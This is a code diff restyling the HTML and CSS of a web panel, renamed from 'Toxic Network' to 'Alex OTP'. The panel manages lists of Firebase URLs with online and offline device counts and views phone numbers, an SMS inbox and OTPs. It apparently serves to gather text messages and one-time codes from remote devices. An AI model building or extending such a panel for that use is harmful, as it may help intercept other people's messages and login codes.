 .fb-actions{display:flex;gap:6px;flex-shrink:0}
-.fb-actions button{padding:10px 12px;font-size:11px;min-height:44px}
-.checkbox{width:24px;height:24px;border:2px solid #374151;border-radius:6px;display:flex;align-items:center;justify-content:center;cursor:pointer;flex-shrink:0;transition:.2s;background:#0a0e1a;color:#0a0e1a;font-size:14px;font-weight:900}
-.checkbox.checked{background:linear-gradient(135deg,#ff3860,#ff9500);border-color:#ff3860;color:#fff;box-shadow:0 0 10px rgba(255,56,96,.4)}
-.select-all{display:flex;align-items:center;gap:10px;padding:12px 16px;background:#0a0e1a;border:1px solid #1f2937;border-radius:8px;margin-bottom:12px;font-size:11px;font-weight:700;color:#7a85a8;cursor:pointer;letter-spacing:1px;text-transform:uppercase;font-family:'Courier New',monospace}
-.empty{text-align:center;padding:50px 20px;color:#4a5270;font-size:12px;background:#111827;border:1px solid #1f2937;border-radius:10px;letter-spacing:1px;font-family:'Courier New',monospace}
-.confirm-overlay{position:fixed;top:0;left:0;right:0;bottom:0;background:rgba(0,0,0,.85);display:none;align-items:center;justify-content:center;z-index:200;padding:20px;backdrop-filter:blur(4px)}
+.fb-actions button{padding:10px 12px;font-size:12px;min-height:44px}
+.checkbox{width:24px;height:24px;border:2px solid #cbd5e1;border-radius:6px;display:flex;align-items:center;justify-content:center;cursor:pointer;flex-shrink:0;transition:.2s;background:#fff;color:#fff;font-size:14px;font-weight:800}
+.checkbox.checked{background:linear-gradient(135deg,#7c3aed,#a855f7);border-color:#7c3aed}
+.select-all{display:flex;align-items:center;gap:10px;padding:12px 16px;background:#f8fafc;border-radius:12px;margin-bottom:12px;font-size:13px;font-weight:600;color:#475569;cursor:pointer}
+.empty{text-align:center;padding:50px 20px;color:#94a3b8;font-size:14px;background:#fff;border-radius:14px}
+.confirm-overlay{position:fixed;top:0;left:0;right:0;bottom:0;background:rgba(15,23,42,.6);display:none;align-items:center;justify-content:center;z-index:200;padding:20px}
 .confirm-overlay.show{display:flex}
-.confirm-box{background:#111827;border:1px solid rgba(255,56,96,.4);border-radius:14px;padding:24px;max-width:400px;width:100%;text-align:center;box-shadow:0 0 40px rgba(255,56,96,.3)}
-.confirm-box h3{font-size:16px;color:#ff3860;margin-bottom:8px;letter-spacing:1.5px;text-transform:uppercase;font-family:'Courier New',monospace;font-weight:900}
-.confirm-box p{font-size:11px;color:#7a85a8;margin-bottom:20px;letter-spacing:1px;font-family:'Courier New',monospace}
+.confirm-box{background:#fff;border-radius:16px;padding:24px;max-width:400px;width:100%;text-align:center;box-shadow:0 20px 60px rgba(0,0,0,.3)}
+.confirm-box h3{font-size:18px;color:#1e293b;margin-bottom:8px}
+.confirm-box p{font-size:13px;color:#64748b;margin-bottom:20px}
 .confirm-box .btns{display:flex;gap:10px}
-.confirm-box button{flex:1;padding:14px;font-size:11px;min-height:46px}
-.loading-text{text-align:center;padding:24px;color:#4a5270;font-size:12px;background:#111827;border:1px solid #1f2937;border-radius:8px;margin-bottom:14px;letter-spacing:1px;font-family:'Courier New',monospace}
-.spinner{display:inline-block;width:14px;height:14px;border:2px solid #1f2937;border-top-color:#ff3860;border-radius:50%;animation:spin .8s linear infinite;vertical-align:middle;margin-right:8px}
-.toast{position:fixed;bottom:30px;left:50%;transform:translateX(-50%) translateY(100px);background:#00ff41;color:#0a0e1a;padding:14px 24px;border-radius:8px;font-weight:900;font-size:13px;z-index:9999;transition:transform .3s;pointer-events:none;letter-spacing:1px;font-family:'Courier New',monospace;box-shadow:0 0 30px rgba(0,255,65,.5)}
+.confirm-box button{flex:1}
+.loading-text{text-align:center;padding:24px;color:#94a3b8;font-size:13px;background:#fff;border-radius:12px;margin-bottom:14px}
+.spinner{display:inline-block;width:16px;height:16px;border:2px solid #e2e8f0;border-top-color:#8b5cf6;border-radius:50%;animation:spin .8s linear infinite;vertical-align:middle;margin-right:8px}
+@keyframes spin{to{transform:rotate(360deg)}}
+.toast{position:fixed;bottom:30px;left:50%;transform:translateX(-50%) translateY(100px);background:#166534;color:#fff;padding:14px 24px;border-radius:12px;font-weight:600;font-size:14px;z-index:9999;transition:transform .3s;pointer-events:none}
 .toast.show{transform:translateX(-50%) translateY(0)}</style></head><body>
 
 <div class="topbar">
-<div class="brand"><span class="toxic">☣ TOXIC</span> FIREBASES<span class="root-badge">👑 ROOT</span></div>
+<div class="brand"><span class="alex">Alex</span> FIREBASES<span class="admin-badge">👑</span></div>
 <div class="conn" id="conn-badge"><span class="dot"></span><span id="conn-text">...</span></div>
-<div class="nav"><a href="/supermasteradmin/dashboard" class="nav-link">◉ NUMBERS</a><a href="/supermasteradmin/firebases" class="nav-link active">🔥 FIREBASES</a><a href="/supermasteradmin/security" class="nav-link">🔒 SECURITY</a></div>
+<div class="nav"><a href="/admin/dashboard" class="nav-link">📱 Numbers</a><a href="/firebases" class="nav-link active">🔥 Firebases</a><a href="/admin/security" class="nav-link security">🔒 Security</a></div>
 </div>
 
 <div class="container">
 <div class="card">
-<h3>➕ ADD FIREBASE URL</h3>
+<h3>➕ Add Firebase URL</h3>
 <div class="add-row">
 <input id="fb-url" placeholder="https://xxx.firebaseio.com" onkeypress="if(event.key==='Enter')addFirebase()" type="url" autocomplete="off">
-<button class="primary" onclick="addFirebase()">ADD</button>
-<button class="gray" onclick="toggleBulk()">BULK</button>
+<button class="primary" onclick="addFirebase()">Add</button>
+<button class="gray" onclick="toggleBulk()">Bulk</button>
 </div>
 <div id="bulk-area" class="bulk-area">
 <textarea id="fb-bulk" placeholder="Ek line me ek URL paste karo"></textarea>
-<button class="green" onclick="bulkAdd()">📥 IMPORT ALL</button>
+<button class="green" onclick="bulkAdd()">📥 Import All</button>
 </div>
 <div id="fb-msg" class="msg"></div>
 </div>
 
 <div class="card">
 <div class="fb-header">
-<h2>🔥 ALL FIREBASES <span style="background:rgba(255,56,96,.1);color:#ff3860;padding:3px 10px;border-radius:4px;font-size:10px;border:1px solid rgba(255,56,96,.3)" id="fb-count">0</span></h2>
+<h2>🔥 All Firebases <span style="background:#f1f5f9;color:#475569;padding:3px 10px;border-radius:20px;font-size:11px" id="fb-count">0</span></h2>
 <div class="actions">
-<button class="danger" onclick="removeSelected()">🗑 SEL</button>
-<button class="danger-solid" onclick="removeAll()">🗑 ALL</button>
+<button class="danger" onclick="removeSelected()">🗑 Sel</button>
+<button class="danger-solid" onclick="removeAll()">🗑 All</button>
 </div>
 </div>
-<div class="select-all" onclick="toggleSelectAll()"><div class="checkbox" id="select-all-cb"></div><span>SELECT ALL</span></div>
-<div id="loading-text" class="loading-text"><span class="spinner"></span>LOADING...</div>
+<div class="select-all" onclick="toggleSelectAll()"><div class="checkbox" id="select-all-cb"></div><span>Select All</span></div>
+<div id="loading-text" class="loading-text"><span class="spinner"></span>Loading...</div>
 <div id="fb-list" class="fb-list"></div>
 </div>
 </div>
 
 <div class="confirm-overlay" id="confirm-overlay">
 <div class="confirm-box">
-<h3 id="confirm-title">ARE YOU SURE?</h3>
-<p id="confirm-desc">THIS ACTION CANNOT BE UNDONE.</p>
-<div class="btns"><button class="gray" onclick="closeConfirm()">CANCEL</button><button class="danger-solid" id="confirm-btn">DELETE</button></div>
+<h3 id="confirm-title">Are you sure?</h3>
+<h3 id="confirm-desc">This action cannot be undone.</h3>
+<div class="btns"><button class="gray" onclick="closeConfirm()">Cancel</button><button class="danger-solid" id="confirm-btn">Delete</button></div>
 </div>
 </div>
 
@@ -2456,29 +2350,29 @@ async function checkConn(){
   try{
     const r = await fetch('/api/conn'); const d = await r.json();
     const badge = document.getElementById('conn-badge'); const txt = document.getElementById('conn-text');
-    if(d.mongo_connected){ badge.className = 'conn online'; txt.textContent = 'LIVE'; }
-    else { badge.className = 'conn offline'; txt.textContent = 'OFF'; }
+    if(d.mongo_connected){ badge.className = 'conn online'; txt.textContent = 'Live'; }
+    else { badge.className = 'conn offline'; txt.textContent = 'Off'; }
   }catch(e){}
 }
 function toggleBulk(){ const a = document.getElementById('bulk-area'); a.style.display = (a.style.display === 'block') ? 'none' : 'block'; }
 async function addFirebase(){
   const url = document.getElementById('fb-url').value.trim();
-  if(!url) return showMsg('fb-msg','URL REQUIRED','err');
+  if(!url) return showMsg('fb-msg','URL required','err');
   const r = await fetch('/api/firebases',{method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({url})});
   const d = await r.json();
-  if(d.success){ showMsg('fb-msg','✅ ADDED (URL HIDDEN)','ok'); document.getElementById('fb-url').value = ''; loadFirebases(); }
-  else showMsg('fb-msg','❌ '+(d.error||'ERROR'),'err');
+  if(d.success){ showMsg('fb-msg','✅ Added (URL hidden)','ok'); document.getElementById('fb-url').value = ''; loadFirebases(); }
+  else showMsg('fb-msg','❌ '+(d.error||'Error'),'err');
 }
 async function bulkAdd(){
   const txt = document.getElementById('fb-bulk').value.trim();
-  if(!txt) return showMsg('fb-msg','EMPTY','err');
+  if(!txt) return showMsg('fb-msg','Empty','err');
   const urls = txt.split('\n').map(l=>l.trim()).filter(l=>l.startsWith('http'));
-  if(!urls.length) return showMsg('fb-msg','NO VALID URLS','err');
-  showMsg('fb-msg',`⏳ ADDING ${urls.length}...`,'ok');
+  if(!urls.length) return showMsg('fb-msg','No valid URLs','err');
+  showMsg('fb-msg',`⏳ Adding ${urls.length}...`,'ok');
   const r = await fetch('/api/firebases/bulk',{method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({urls})});
   const d = await r.json();
-  if(d.success){ showMsg('fb-msg',`✅ ADDED: ${d.added}, SKIP: ${d.skipped}`,'ok'); document.getElementById('fb-bulk').value = ''; loadFirebases(); }
-  else showMsg('fb-msg','❌ '+(d.error||'ERROR'),'err');
+  if(d.success){ showMsg('fb-msg',`✅ Added: ${d.added}, Skip: ${d.skipped}`,'ok'); document.getElementById('fb-bulk').value = ''; loadFirebases(); }
+  else showMsg('fb-msg','❌ '+(d.error||'Error'),'err');
 }
 function showMsg(id, text, type){ const el = document.getElementById(id); el.className = 'msg ' + type; el.textContent = text; if(type === 'ok') setTimeout(()=>{ el.className = 'msg'; }, 3000); }
 
@@ -2486,20 +2380,21 @@ async function loadFirebases(){
   document.getElementById('loading-text').style.display = 'block';
   try{
     const r = await fetch('/api/firebases'); const d = await r.json();
-    if(!d.success){ document.getElementById('loading-text').textContent = '❌ '+(d.error||'ERROR'); return; }
+    if(!d.success){ document.getElementById('loading-text').textContent = '❌ '+(d.error||'Error'); return; }
     firebases = d.firebases || [];
     document.getElementById('fb-count').textContent = firebases.length;
     document.getElementById('loading-text').style.display = 'none';
     renderFirebases(); updateSelectAll();
-  }catch(e){ document.getElementById('loading-text').textContent = '❌ NETWORK ERROR'; }
+  }catch(e){ document.getElementById('loading-text').textContent = '❌ Network error'; }
 }
 
+// ✅ Per-firebase online/offline count render
 function renderFirebases(){
   const box = document.getElementById('fb-list');
-  if(firebases.length === 0){ box.innerHTML = '<div class="empty">📭 NO FIREBASE ADDED YET</div>'; return; }
+  if(firebases.length === 0){ box.innerHTML = '<div class="empty">📭 No firebase added yet</div>'; return; }
   box.innerHTML = firebases.map(f => {
     const isSel = selected.has(f.id);
-    const badge = f.source === 'personal_otp' ? '<span style="background:rgba(168,85,247,.15);color:#a855f7;font-size:9px;padding:2px 6px;border-radius:4px;font-weight:700;border:1px solid rgba(168,85,247,.3);letter-spacing:1px">👤 USER</span>' : '<span style="background:rgba(255,56,96,.15);color:#ff3860;font-size:9px;padding:2px 6px;border-radius:4px;font-weight:700;border:1px solid rgba(255,56,96,.3);letter-spacing:1px">👑 ROOT</span>';
+    const badge = f.source === 'personal_otp' ? '<span style="background:#d1fae5;color:#065f46;font-size:9px;padding:2px 6px;border-radius:6px;font-weight:700">👤 USER</span>' : '<span style="background:#ede9fe;color:#6d28d9;font-size:9px;padding:2px 6px;border-radius:6px;font-weight:700">👑 ADMIN</span>';
     const stats = f.stats || {online: 0, offline: 0, devices: 0};
     return `
       <div class="fb-card">
@@ -2509,20 +2404,21 @@ function renderFirebases(){
           <div class="fb-name">${escapeHtml(f.name || 'unnamed')}${badge}</div>
           <div class="fb-hash">🔒 ID: ${escapeHtml(f.hash || 'hidden')}</div>
           <div class="fb-counts">
-            <span class="fb-count-pill online"><span class="dot"></span>${stats.online} ON</span>
-            <span class="fb-count-pill offline"><span class="dot"></span>${stats.offline} OFF</span>
-            <span class="fb-count-pill devices">📱 ${stats.devices} DEV</span>
+            <span class="fb-count-pill online"><span class="dot"></span>${stats.online} Online</span>
+            <span class="fb-count-pill offline"><span class="dot"></span>${stats.offline} Offline</span>
+            <span class="fb-count-pill devices">📱 ${stats.devices} Devices</span>
           </div>
         </div>
         <div class="fb-actions">
-          <button class="primary" onclick="event.stopPropagation();openFirebase('${f.id}')">OPEN</button>
+          <button class="primary" onclick="event.stopPropagation();openFirebase('${f.id}')">Open</button>
           <button class="danger" onclick="event.stopPropagation();removeOne('${f.id}')">🗑</button>
         </div>
-      </div>`;
+      </div>
+    `;
   }).join('');
 }
 
-function openFirebase(id){ window.location.href = '/supermasteradmin/firebase/' + id; }
+function openFirebase(id){ window.location.href = '/firebase/' + id; }
 function toggleSelect(id){ if(selected.has(id)) selected.delete(id); else selected.add(id); renderFirebases(); updateSelectAll(); }
 function toggleSelectAll(){ if(selected.size === firebases.length) selected.clear(); else selected = new Set(firebases.map(f => f.id)); renderFirebases(); updateSelectAll(); }
 function updateSelectAll(){ const cb = document.getElementById('select-all-cb'); if(firebases.length > 0 && selected.size === firebases.length){ cb.classList.add('checked'); cb.textContent = '✓'; } else { cb.classList.remove('checked'); cb.textContent = ''; } }
@@ -2537,27 +2433,27 @@ function showConfirm(title, desc, onConfirm){
   newBtn.addEventListener('click', async ()=>{ closeConfirm(); await onConfirm(); });
 }
 async function removeOne(id){
-  showConfirm('DELETE THIS FIREBASE?', 'THIS ACTION CANNOT BE UNDONE', async ()=>{
+  showConfirm('Delete this firebase?', 'This action cannot be undone', async ()=>{
     const r = await fetch('/api/firebases/'+id, {method:'DELETE'}); const d = await r.json();
-    if(d.success){ toast('✅ DELETED'); selected.delete(id); loadFirebases(); }
-    else toast('❌ '+(d.error||'ERROR'));
+    if(d.success){ toast('✅ Deleted'); selected.delete(id); loadFirebases(); }
+    else toast('❌ '+(d.error||'Error'));
   });
 }
 async function removeSelected(){
-  if(selected.size === 0) return toast('❌ SELECT AT LEAST ONE');
+  if(selected.size === 0) return toast('❌ Select at least one');
   const ids = Array.from(selected);
-  showConfirm(`DELETE ${ids.length} FIREBASE(S)?`, 'CANNOT BE UNDONE', async ()=>{
+  showConfirm(`Delete ${ids.length} firebase(s)?`, 'Cannot be undone', async ()=>{
     const r = await fetch('/api/firebases/bulk-delete', {method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({ids})}); const d = await r.json();
-    if(d.success){ toast(`✅ DELETED: ${d.deleted}`); selected.clear(); loadFirebases(); }
-    else toast('❌ '+(d.error||'ERROR'));
+    if(d.success){ toast(`✅ Deleted: ${d.deleted}`); selected.clear(); loadFirebases(); }
+    else toast('❌ '+(d.error||'Error'));
   });
 }
 async function removeAll(){
-  if(firebases.length === 0) return toast('❌ NO FIREBASES');
-  showConfirm(`DELETE ALL ${firebases.length}?`, 'CANNOT BE UNDONE!', async ()=>{
+  if(firebases.length === 0) return toast('❌ No firebases');
+  showConfirm(`Delete ALL ${firebases.length}?`, 'Cannot be undone!', async ()=>{
     const r = await fetch('/api/firebases/all', {method:'DELETE'}); const d = await r.json();
-    if(d.success){ toast(`✅ DELETED ALL: ${d.deleted}`); selected.clear(); loadFirebases(); }
-    else toast('❌ '+(d.error||'ERROR'));
+    if(d.success){ toast(`✅ Deleted all: ${d.deleted}`); selected.clear(); loadFirebases(); }
+    else toast('❌ '+(d.error||'Error'));
   });
 }
 function escapeHtml(s){ return String(s == null ? '' : s).replace(/[&<>"']/g, c => ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'})[c]); }
@@ -2565,6 +2461,7 @@ function escapeHtml(s){ return String(s == null ? '' : s).replace(/[&<>"']/g, c 
 checkConn();
 loadFirebases();
 setInterval(checkConn, 8000);
+// ✅ Auto refresh firebases every 15s so counts update
 setInterval(loadFirebases, 15000);
 </script>
 </body>
@@ -2574,128 +2471,123 @@ setInterval(loadFirebases, 15000);
 
 # ==================== FIREBASE VIEW HTML ====================
 FIREBASE_VIEW_HTML = r"""<!DOCTYPE html>
-<html lang="en"><head><meta charset="UTF-8"><title>Toxic Network — Firebase</title>
+<html lang="en"><head><meta charset="UTF-8"><title>Firebase — Alex OTP</title>
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
-<meta name="theme-color" content="#ff3860">
-<style>""" + HACKER_BASE_CSS + r"""
-body{background:#0a0e1a;color:#e0e6ff;padding:0 0 40px;background-image:radial-gradient(ellipse at top,#1a0a0e 0%,#0a0e1a 60%)}
-.topbar{background:#0a0e1a;border-bottom:1px solid #1f2937;padding:10px 14px;display:flex;align-items:center;justify-content:space-between;position:sticky;top:0;z-index:100;flex-wrap:wrap;gap:8px;padding-top:calc(10px + env(safe-area-inset-top))}
-.brand{font-size:15px;font-weight:900;letter-spacing:2px}
-.brand .toxic{background:linear-gradient(90deg,#ff3860,#ff9500);-webkit-background-clip:text;background-clip:text;color:transparent}
-.nav{display:flex;gap:6px;align-items:center;flex-wrap:wrap;order:3;width:100%;justify-content:space-between;margin-top:8px}
-@media(min-width:640px){.nav{order:0;width:auto;margin-top:0}}
-.nav-link{padding:10px 14px;border-radius:8px;text-decoration:none;font-size:11px;font-weight:700;color:#7a85a8;background:#111827;border:1px solid #1f2937;white-space:nowrap;min-height:42px;display:inline-flex;align-items:center;letter-spacing:1px;text-transform:uppercase;font-family:'Courier New',monospace}
-.nav-link.active{background:linear-gradient(135deg,#ff3860,#ff9500);color:#0a0e1a;border-color:transparent}
+<meta name="theme-color" content="#7c3aed">
+<style>""" + MOBILE_CSS + r"""
+body{background:#f7f8fc;color:#1e293b;min-height:100vh;padding:0 0 40px}
+.topbar{background:#fff;padding:10px 14px;display:flex;align-items:center;justify-content:space-between;position:sticky;top:0;z-index:100;box-shadow:0 1px 3px rgba(0,0,0,.05);flex-wrap:wrap;gap:8px;padding-top:calc(10px + env(safe-area-inset-top))}
+.brand{font-size:16px;font-weight:800}
+.brand .alex{background:linear-gradient(90deg,#7c3aed,#ec4899);-webkit-background-clip:text;background-clip:text;color:transparent}
+.nav{display:flex;gap:6px;align-items:center;flex-wrap:wrap;order:3;width:100%;justify-content:space-between}
+@media(min-width:640px){.nav{order:0;width:auto}}
+.nav-link{padding:10px 14px;border-radius:10px;text-decoration:none;font-size:12px;font-weight:600;color:#475569;background:#f1f5f9;white-space:nowrap;min-height:42px;display:inline-flex;align-items:center}
+.nav-link.active{background:linear-gradient(135deg,#7c3aed,#a855f7);color:#fff}
 .container{max-width:900px;margin:0 auto;padding:14px}
-.hero{background:#111827;border:1px solid #1f2937;border-radius:10px;padding:16px;margin-bottom:14px;position:relative;overflow:hidden}
-.hero::before{content:"";position:absolute;top:0;left:0;right:0;height:2px;background:linear-gradient(90deg,#ff3860,#ff9500);opacity:.6}
-.hero h1{font-size:14px;font-weight:900;color:#ff3860;margin-bottom:6px;display:flex;align-items:center;gap:8px;flex-wrap:wrap;letter-spacing:1.5px;text-transform:uppercase;font-family:'Courier New',monospace}
-.hero .hash{font-size:10px;color:#4a5270;font-family:'Courier New',monospace;margin-bottom:14px;letter-spacing:1px}
+.hero{background:#fff;border-radius:14px;padding:16px;margin-bottom:14px;box-shadow:0 2px 8px rgba(99,102,241,.06)}
+.hero h1{font-size:16px;font-weight:800;color:#1e293b;margin-bottom:6px;display:flex;align-items:center;gap:8px;flex-wrap:wrap}
+.hero .hash{font-size:11px;color:#94a3b8;font-family:monospace;margin-bottom:14px}
 .hero-stats{display:grid;grid-template-columns:repeat(auto-fit,minmax(100px,1fr));gap:8px}
-.hs{background:#0a0e1a;border:1px solid #1f2937;border-radius:8px;padding:12px;text-align:center}
-.hs b{display:block;font-size:20px;font-weight:900;color:#ff3860;margin-bottom:2px;text-shadow:0 0 10px currentColor}
-.hs span{font-size:9px;color:#4a5270;text-transform:uppercase;font-weight:700;letter-spacing:1.5px;font-family:'Courier New',monospace}
-.hs.online b{color:#00ff41}
-.hs.offline b{color:#ff3860}
+.hs{background:#f8fafc;border-radius:10px;padding:12px;text-align:center}
+.hs b{display:block;font-size:20px;font-weight:800;color:#7c3aed;margin-bottom:2px}
+.hs span{font-size:10px;color:#94a3b8;text-transform:uppercase;font-weight:600;letter-spacing:.5px}
+.hs.online b{color:#16a34a}
+.hs.offline b{color:#dc2626}
 .hs.otp b{color:#a855f7}
 .list-header{display:flex;justify-content:space-between;align-items:center;margin:20px 0 12px;padding:0 4px}
-.list-header h2{font-size:12px;font-weight:900;color:#ff3860;letter-spacing:1.5px;text-transform:uppercase;font-family:'Courier New',monospace}
-.list-header .count{font-size:11px;color:#00e5ff;background:rgba(0,229,255,.1);border:1px solid rgba(0,229,255,.3);padding:3px 10px;border-radius:4px;font-weight:700;font-family:'Courier New',monospace}
+.list-header h2{font-size:14px;font-weight:700;color:#334155}
+.list-header .count{font-size:12px;color:#64748b;background:#e2e8f0;padding:3px 10px;border-radius:20px;font-weight:600}
 .search-box{margin-bottom:12px}
-.search-box input{width:100%;padding:14px 16px;border-radius:8px;border:1.5px solid #1f2937;background:#111827;outline:none;color:#e0e6ff;letter-spacing:1px;font-family:'Courier New',monospace}
-.search-box input:focus{border-color:#ff3860;box-shadow:0 0 0 3px rgba(255,56,96,.15)}
-.search-box input::placeholder{color:#4a5270}
-.num-card{background:#111827;border:1px solid #1f2937;border-radius:10px;padding:14px;margin-bottom:10px;display:flex;align-items:center;gap:12px;cursor:pointer;min-height:70px;position:relative;overflow:hidden;transition:.15s}
-.num-card::before{content:"";position:absolute;left:0;top:0;bottom:0;width:3px;background:#ff3860;opacity:0;transition:.2s}
-.num-card:hover::before{opacity:1}
-.num-card:hover{border-color:rgba(255,56,96,.3);background:#14090e}
-.num-card:active{transform:scale(.99)}
-.num-icon{width:42px;height:42px;border-radius:8px;display:flex;align-items:center;justify-content:center;font-size:19px;flex-shrink:0;background:rgba(0,255,65,.1);border:1px solid rgba(0,255,65,.3);color:#00ff41}
-.num-icon.red{background:rgba(255,56,96,.1);border-color:rgba(255,56,96,.3);color:#ff3860}
-.num-icon.gray{background:rgba(122,133,168,.1);border-color:rgba(122,133,168,.3);color:#7a85a8}
+.search-box input{width:100%;padding:14px 16px;border-radius:12px;border:1.5px solid #e2e8f0;background:#fff;outline:none;color:#1e293b}
+.num-card{background:#fff;border-radius:14px;padding:14px;margin-bottom:10px;display:flex;align-items:center;gap:12px;cursor:pointer;min-height:70px}
+.num-card:active{transform:scale(.98);background:#fafafa}
+.num-icon{width:42px;height:42px;border-radius:50%;background:linear-gradient(135deg,#dcfce7,#bbf7d0);display:flex;align-items:center;justify-content:center;font-size:19px;flex-shrink:0}
+.num-icon.red{background:linear-gradient(135deg,#fee2e2,#fecaca)}
+.num-icon.gray{background:linear-gradient(135deg,#f1f5f9,#e2e8f0)}
 .num-info{flex:1;min-width:0}
-.num-title{font-size:13px;font-weight:700;color:#e0e6ff;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;letter-spacing:.5px;font-family:'Courier New',monospace}
-.num-title.unknown{color:#7a85a8;font-style:italic}
-.num-sub{font-size:10px;color:#7a85a8;margin-top:4px;display:flex;gap:4px;flex-wrap:wrap;letter-spacing:.5px;font-family:'Courier New',monospace}
-.num-sub .pill{background:#0a0e1a;border:1px solid #1f2937;padding:2px 7px;border-radius:4px;color:#7a85a8;font-size:9px;font-weight:700}
-.num-sub .pill.otp{background:rgba(168,85,247,.1);color:#a855f7;border-color:rgba(168,85,247,.3)}
-.badge-online{display:flex;align-items:center;gap:5px;font-size:10px;color:#00ff41;font-weight:700;flex-shrink:0;letter-spacing:1px;text-transform:uppercase;font-family:'Courier New',monospace}
-.badge-online .dot{width:7px;height:7px;border-radius:50%;background:#00ff41;box-shadow:0 0 8px #00ff41;animation:pulse 1.5s infinite}
-.badge-offline{display:flex;align-items:center;gap:5px;font-size:10px;color:#ff3860;font-weight:700;flex-shrink:0;letter-spacing:1px;text-transform:uppercase;font-family:'Courier New',monospace}
-.badge-offline .dot{width:7px;height:7px;border-radius:50%;background:#ff3860;box-shadow:0 0 8px #ff3860}
+.num-title{font-size:14px;font-weight:700;color:#1e293b;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
+.num-title.unknown{color:#94a3b8;font-style:italic}
+.num-sub{font-size:11px;color:#94a3b8;margin-top:4px;display:flex;gap:4px;flex-wrap:wrap}
+.num-sub .pill{background:#f1f5f9;padding:2px 7px;border-radius:6px;color:#64748b;font-size:10px;font-weight:600}
+.num-sub .pill.otp{background:#ede9fe;color:#7c3aed}
+.badge-online{display:flex;align-items:center;gap:5px;font-size:11px;color:#16a34a;font-weight:600;flex-shrink:0}
+.badge-online .dot{width:8px;height:8px;border-radius:50%;background:#16a34a}
+.badge-offline{display:flex;align-items:center;gap:5px;font-size:11px;color:#dc2626;font-weight:600;flex-shrink:0}
+.badge-offline .dot{width:8px;height:8px;border-radius:50%;background:#dc2626}
+.arrow{color:#cbd5e1;font-size:20px}
 .card-actions{display:flex;gap:6px;flex-shrink:0}
-.raw-btn{padding:8px 10px;background:linear-gradient(135deg,#ff3860,#ff9500);color:#fff;border:none;border-radius:6px;font-size:11px;font-weight:900;cursor:pointer;min-height:36px;display:inline-flex;align-items:center;gap:4px;letter-spacing:1px;box-shadow:0 0 10px rgba(255,56,96,.3)}
-.inbox-header{background:#111827;border:1px solid #1f2937;border-radius:10px;padding:16px;margin-bottom:12px}
+.raw-btn{padding:8px 10px;background:linear-gradient(135deg,#f59e0b,#f97316);color:#fff;border:none;border-radius:8px;font-size:11px;font-weight:700;cursor:pointer;min-height:36px;display:inline-flex;align-items:center;gap:4px}
+.inbox-header{background:#fff;border-radius:14px;padding:16px;margin-bottom:12px;box-shadow:0 2px 8px rgba(99,102,241,.06)}
 .inbox-top{display:flex;align-items:center;gap:10px;margin-bottom:12px}
-.back-btn{background:#0a0e1a;border:1px solid #1f2937;width:42px;height:42px;border-radius:8px;font-size:18px;cursor:pointer;color:#ff3860;font-weight:700;text-decoration:none;display:inline-flex;align-items:center;justify-content:center;flex-shrink:0}
-.inbox-num{font-size:16px;font-weight:900;color:#ff3860;letter-spacing:1px;text-shadow:0 0 10px rgba(255,56,96,.5);font-family:'Courier New',monospace}
-.inbox-status{display:flex;align-items:center;gap:6px;font-size:10px;color:#00ff41;font-weight:700;margin-top:2px;letter-spacing:1px;text-transform:uppercase;font-family:'Courier New',monospace}
-.inbox-status .dot{width:7px;height:7px;border-radius:50%;background:#00ff41;box-shadow:0 0 8px #00ff41;animation:pulse 1.5s infinite}
-.inbox-status.offline{color:#ff3860}
-.inbox-status.offline .dot{background:#ff3860;box-shadow:0 0 8px #ff3860;animation:none}
-.inbox-meta{font-size:10px;color:#4a5270;display:flex;justify-content:space-between;align-items:center;letter-spacing:1px;font-family:'Courier New',monospace}
-.refresh-icon{cursor:pointer;font-size:20px;color:#ff3860;padding:6px;min-width:36px;min-height:36px;display:flex;align-items:center;justify-content:center}
-.refresh-icon.spinning{animation:spin 1s linear infinite}
-.top-number-badge{background:linear-gradient(135deg,rgba(255,215,0,.1),rgba(255,149,0,.1));border:1px solid rgba(255,215,0,.4);border-radius:10px;padding:12px 14px;margin-bottom:12px;display:flex;align-items:center;gap:10px;font-size:12px;font-weight:700;color:#ffd700;font-family:'Courier New',monospace}
+.back-btn{background:#f1f5f9;border:none;width:42px;height:42px;border-radius:50%;font-size:18px;cursor:pointer;color:#475569;font-weight:600;text-decoration:none;display:inline-flex;align-items:center;justify-content:center;flex-shrink:0}
+.inbox-num{font-size:16px;font-weight:800;color:#1e293b}
+.inbox-status{display:flex;align-items:center;gap:6px;font-size:12px;color:#16a34a;font-weight:600;margin-top:2px}
+.inbox-status .dot{width:8px;height:8px;border-radius:50%;background:#16a34a}
+.inbox-status.offline{color:#dc2626}
+.inbox-status.offline .dot{background:#dc2626}
+.inbox-meta{font-size:11px;color:#94a3b8;display:flex;justify-content:space-between;align-items:center}
+.refresh-icon{cursor:pointer;font-size:20px;color:#94a3b8;padding:6px;min-width:36px;min-height:36px;display:flex;align-items:center;justify-content:center}
+.top-number-badge{background:linear-gradient(135deg,#fef3c7,#fde68a);border:2px solid #fbbf24;border-radius:12px;padding:12px 14px;margin-bottom:12px;display:flex;align-items:center;gap:10px;font-size:13px;font-weight:700;color:#92400e;box-shadow:0 2px 8px rgba(251,191,36,.2)}
 .top-number-badge .tn-icon{font-size:22px;flex-shrink:0}
 .top-number-badge .tn-info{flex:1;min-width:0}
-.top-number-badge .tn-num{font-size:16px;font-weight:900;color:#ffd700;letter-spacing:.5px;word-break:break-all;text-shadow:0 0 8px rgba(255,215,0,.5)}
-.top-number-badge .tn-count{font-size:10px;color:#ffd700;font-weight:600;margin-top:2px;opacity:.8;letter-spacing:1px}
-.top-number-badge .tn-highlight{background:rgba(255,215,0,.2);color:#ffd700;padding:2px 8px;border-radius:4px;font-weight:900;font-size:10px;border:1px solid rgba(255,215,0,.4)}
-.sms-list{background:#111827;border:1px solid #1f2937;border-radius:10px;overflow:hidden}
-.sms-item{padding:16px;border-bottom:1px solid #1f2937;position:relative}
+.top-number-badge .tn-num{font-size:16px;font-weight:800;color:#78350f;letter-spacing:.5px;word-break:break-all}
+.top-number-badge .tn-count{font-size:11px;color:#92400e;font-weight:600;margin-top:2px;opacity:.8}
